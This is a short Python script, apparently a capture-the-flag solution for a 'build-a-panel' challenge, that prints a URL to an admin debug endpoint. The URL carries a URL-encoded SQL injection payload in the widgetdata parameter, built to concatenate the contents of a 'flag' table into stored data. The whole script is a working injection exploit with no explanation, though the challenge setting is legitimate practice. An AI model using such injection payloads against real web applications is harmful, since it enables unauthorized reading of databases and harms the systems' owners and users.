#!/usr/bin/env python3

import urllib.parse

panelid = "l3o_panel"
widgetname = "l3o_widget"
widgetdata = "\"' || (SELECT * FROM flag) || '\""
widgetdata = urllib.parse.quote(widgetdata)

print(
    f"https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid={panelid}&widgetname={widgetname}&widgetdata={widgetdata}"
)